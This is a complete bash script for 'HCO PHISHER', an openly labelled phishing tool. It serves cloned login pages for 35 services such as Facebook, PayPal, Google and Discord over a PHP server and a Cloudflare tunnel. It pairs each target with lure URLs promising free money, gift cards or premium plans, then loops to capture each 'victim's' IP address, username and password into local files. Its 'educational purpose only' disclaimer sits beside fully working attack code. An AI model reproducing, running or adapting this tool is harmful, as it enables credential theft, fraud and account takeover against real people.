#!/bin/bash
###################################
#Author  : Azhar (Team - HCO)     #
#Project : HCO PHISHER            #
#Type    : Phishing Tool          #
#lang    : Shell Script           #
#Owner   : Azhar YT #
###################################


#################################
#          C O L O U R S        #
#################################
orange='\033[0;33m'             #
white="\033[1;37m"              #
grey="\033[0;37m"               #
purple="\033[1;35m"             #
red="\033[1;31m"                #
green="\033[1;32m"              #
yellow="\033[1;33m"             #
purple="\033[0;35m"             #
cyan="\033[0;36m"               #
cyan1="\033[1;36m"              #
sta="\e[5m"                     #
cafe="\033[0;33m"               #
fiuscha="\033[0;35m"            #
sto="\e[25m"                    #
blue="\033[1;34m"               #
l_red="\033[1;37;41m"           #
nc="\033[0m"                    # 
pink="\e[95m"                   #
#################################

# Script Starting

__version__="1.0"

## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='8080' 

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi

if [[ -e "start.py" ]]; then
    rm "start.py"
    
fi

msg() {
	printf "${green}[${nc}+${green}] ${white}${1}\n${nc}"
}
errormsg () {
        printf "${red}[!] ${white}${1}\n${nc}"
}

## Script termination
exit_on_signal_SIGINT() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
	return
}

## Kill already running process
kill_pid() {
	check_PID="php cloudflared"
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then # Check for Process
			killall ${process} > /dev/null 2>&1 # Kill the Process
		fi
	done
}

# Check for a newer release
check_update(){
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
	
	msg "\n\n${green}[${nc}+${green}] ${white}No Update are available.${nc}\n\n"
	
}

## Check Internet Status
check_status() {
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
	timeout 3s curl -fIs "https://api.github.com" > /dev/null
	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
}

## Banner
banner() {
	printf "${green}

                     ▒█░▒█ ░ ▒█▀▀█ ░ ▒█▀▀▀█ 
                     ▒█▀▀█ ▄ ▒█░░░ ▄ ▒█░░▒█ 
                     ▒█░▒█ █ ▒█▄▄█ █ ▒█▄▄▄█ 

                  ▒█▀▀█ ▒█░▒█ ▀█▀ ▒█▀▀▀█ ▒█░▒█
                  ▒█▄▄█ ▒█▀▀█ ▒█░ ░▀▀▀▄▄ ▒█▀▀█
                  ▒█░░░ ▒█░▒█ ▄█▄ ▒█▄▄▄█ ▒█░▒█\n                                            ${yellow}v1.0${green}\n"
printf "${red} ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
printf "         ${yellow}.:H a c k e r  C o l o n y  O f f i c i a l:.\n"
printf "${red} ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n" 
printf "          ${cyan}Phishing Tool BY Hacker colony offcial\n\n\n"

}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if [[ ! $(command -v proot) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
			pkg install proot resolv-conf -y
		fi

		if [[ ! $(command -v tput) ]]; then
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
			pkg install ncurses-utils -y
		fi
	fi

	if [[ $(command -v php) && $(command -v cloudflared) && $(command -v curl) && $(command -v unzip) ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl unzip cloudflared)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN} Author   ${RED}:  ${ORANGE} AZHAR${RED}[ ${ORANGE}HCO Hackers Colony Official${RED}]
		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/hackerscolonyofficial
		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}

		${WHITE} ${REDBG}Warning:${RESETBG}
		${CYAN}  This Tool is made for educational purpose 
		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
		  any misuse of this toolkit ${RED}!${WHITE}

		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

## Choose custom port
cusport() {
	echo
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
		echo -e "\n"
		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
			PORT=${CU_P}
			echo
		else
			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
			{ sleep 2; clear; banner; cusport; }
		fi		
	else 
		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
	fi
}

## Setup website and start php server
setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Setting up server..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Get IP address
capture_ip() {
	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Victim's IP : ${GREEN}$IP"
	cat .server/www/ip.txt >> auth/ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "${RED}[${WHITE}-${RED}]${BLUE} Account : ${GREEN}$ACCOUNT"
	echo -e "${RED}[${WHITE}-${RED}]${BLUE} Password : ${GREEN}$PASSWORD"
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} IP saved in : ${ORANGE}auth/ip.txt"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE}Login credentials saved in : ${ORANGE}auth/usernames.dat"
	cat .server/www/usernames.txt >> auth/usernames.dat
	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} Waiting for Next Victim's click, ${BLUE}Ctrl + C ${CYAN}to exit. "
}

## Print data
capture_data() {
	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${CYAN} Waiting for Victim's click, ${BLUE}Ctrl + C ${CYAN}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} New Victim Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start Cloudflared
start_cloudflared() { 
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

	cloudflared tunnel --url http://"$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &

	sleep 8
	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
	custom_url "$cldflr_url"
	capture_data
}




## Start localhost
start_localhost() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner; }
	cat <<- EOF

		${CYAN}[${WHITE}01${CYAN}]${ORANGE} Localhost
		${CYAN}[${WHITE}02${CYAN}]${ORANGE} Cloudflared

	EOF

	read -p "${RED}[${WHITE}-${RED}]${BLUE} Select a port forwarding service : ${GREEN}"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_cloudflared;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; tunnel_menu; };;
	esac
}


## URL Shortner
site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }


custom_url() {
	url=${1#http*//}

	{ sleep 1; clear; banner; }
	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com) ]]; then
		url="https://$url"
		echo -e "\n${RED}[${WHITE}-${RED}]${ORANGE} URL : ${GREEN}$url"
	else
	    url="cloudflared tunnel --url http://$HOST:$PORT"
		echo -e "\n${RED}[${WHITE}-${RED}]${ORANGE} No Direct Link found!!\n\n${GREEN}[${WHITE}*${GREEN}] ${BLUE}Run This command in 2nd Terminal :-\n\t${GREEN}$url"
	fi

	
}


## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}#${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}#${RED}]${ORANGE}

		${RED}[${WHITE}01${RED}]${CYAN} Facebook      ${RED}[${WHITE}11${RED}]${CYAN} Twitch       ${RED}[${WHITE}21${RED}]${CYAN} DeviantArt
		${RED}[${WHITE}02${RED}]${CYAN} Instagram     ${RED}[${WHITE}12${RED}]${CYAN} Pinterest    ${RED}[${WHITE}22${RED}]${CYAN} Badoo
		${RED}[${WHITE}03${RED}]${CYAN} Google        ${RED}[${WHITE}13${RED}]${CYAN} Snapchat     ${RED}[${WHITE}23${RED}]${CYAN} Origin
		${RED}[${WHITE}04${RED}]${CYAN} Microsoft     ${RED}[${WHITE}14${RED}]${CYAN} Linkedin     ${RED}[${WHITE}24${RED}]${CYAN} DropBox	
		${RED}[${WHITE}05${RED}]${CYAN} Netflix       ${RED}[${WHITE}15${RED}]${CYAN} Ebay         ${RED}[${WHITE}25${RED}]${CYAN} Yahoo		
		${RED}[${WHITE}06${RED}]${CYAN} Paypal        ${RED}[${WHITE}16${RED}]${CYAN} Quora        ${RED}[${WHITE}26${RED}]${CYAN} Wordpress
		${RED}[${WHITE}07${RED}]${CYAN} Steam         ${RED}[${WHITE}17${RED}]${CYAN} Protonmail   ${RED}[${WHITE}27${RED}]${CYAN} Yandex			
		${RED}[${WHITE}08${RED}]${CYAN} Twitter       ${RED}[${WHITE}18${RED}]${CYAN} Spotify      ${RED}[${WHITE}28${RED}]${CYAN} StackoverFlow
		${RED}[${WHITE}09${RED}]${CYAN} Playstation   ${RED}[${WHITE}19${RED}]${CYAN} Reddit       ${RED}[${WHITE}29${RED}]${CYAN} Vk
		${RED}[${WHITE}10${RED}]${CYAN} Tiktok        ${RED}[${WHITE}20${RED}]${CYAN} Adobe        ${RED}[${WHITE}30${RED}]${CYAN} XBOX
		${RED}[${WHITE}31${RED}]${CYAN} Mediafire     ${RED}[${WHITE}32${RED}]${CYAN} Gitlab       ${RED}[${WHITE}33${RED}]${CYAN} Github
		${RED}[${WHITE}34${RED}]${CYAN} Discord       ${RED}[${WHITE}35${RED}]${CYAN} Roblox 

		${RED}[${WHITE}99${RED}]${GREEN} About         ${RED}[${WHITE}00${RED}]${GREEN} Exit

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
		    website="facebook"
			tunnel_menu;;
		2 | 02)
		    website="insta_followers"
			tunnel_menu;;
		3 | 03)
		    website="google_new"
			tunnel_menu;;
		4 | 04)
			website="microsoft"
			mask='https://unlimited-onedrive-space-for-free'
			tunnel_menu;;
		5 | 05)
			website="netflix"
			mask='https://upgrade-your-netflix-plan-free'
			tunnel_menu;;
		6 | 06)
			website="paypal"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		7 | 07)
			website="steam"
			mask='https://steam-500-usd-gift-card-free'
			tunnel_menu;;
		8 | 08)
			website="twitter"
			mask='https://get-blue-badge-on-twitter-free'
			tunnel_menu;;
		9 | 09)
			website="playstation"
			mask='https://playstation-500-usd-gift-card-free'
			tunnel_menu;;
		10)
			website="tiktok"
			mask='https://tiktok-free-liker'
			tunnel_menu;;
		11)
			website="twitch"
			mask='https://unlimited-twitch-tv-user-for-free'
			tunnel_menu;;
		12)
			website="pinterest"
			mask='https://get-a-premium-plan-for-pinterest-free'
			tunnel_menu;;
		13)
			website="snapchat"
			mask='https://view-locked-snapchat-accounts-secretly'
			tunnel_menu;;
		14)
			website="linkedin"
			mask='https://get-a-premium-plan-for-linkedin-free'
			tunnel_menu;;
		15)
			website="ebay"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		16)
			website="quora"
			mask='https://quora-premium-for-free'
			tunnel_menu;;
		17)
			website="protonmail"
			mask='https://protonmail-pro-basics-for-free'
			tunnel_menu;;
		18)
			website="spotify"
			mask='https://convert-your-account-to-spotify-premium'
			tunnel_menu;;
		19)
			website="reddit"
			mask='https://reddit-official-verified-member-badge'
			tunnel_menu;;
		20)
			website="adobe"
			mask='https://get-adobe-lifetime-pro-membership-free'
			tunnel_menu;;
		21)
			website="deviantart"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		22)
			website="badoo"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		23)
			website="origin"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		24)
			website="dropbox"
			mask='https://get-1TB-cloud-storage-free'
			tunnel_menu;;
		25)
			website="yahoo"
			mask='https://grab-mail-from-anyother-yahoo-account-free'
			tunnel_menu;;
		26)
			website="wordpress"
			mask='https://unlimited-wordpress-traffic-free'
			tunnel_menu;;
		27)
			website="yandex"
			mask='https://grab-mail-from-anyother-yandex-account-free'
			tunnel_menu;;
		28)
			website="stackoverflow"
			mask='https://get-stackoverflow-lifetime-pro-membership-free'
			tunnel_menu;;
		29)
		    website="vk"
			tunnel_menu;;
		30)
			website="xbox"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		31)
			website="mediafire"
			mask='https://get-1TB-on-mediafire-free'
			tunnel_menu;;
		32)
			website="gitlab"
			mask='https://get-1k-followers-on-gitlab-free'
			tunnel_menu;;
		33)
			website="github"
			mask='https://get-1k-followers-on-github-free'
			tunnel_menu;;
		34)
			website="discord"
			mask='https://get-discord-nitro-free'
			tunnel_menu;;
		35)
			website="roblox"
			mask='https://get-free-robux'
			tunnel_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Main
kill_pid
dependencies
check_status
main_menu
